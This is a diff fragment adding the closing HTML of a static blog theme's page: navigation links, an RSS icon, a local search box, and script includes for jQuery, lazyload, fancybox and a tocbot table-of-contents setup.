+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
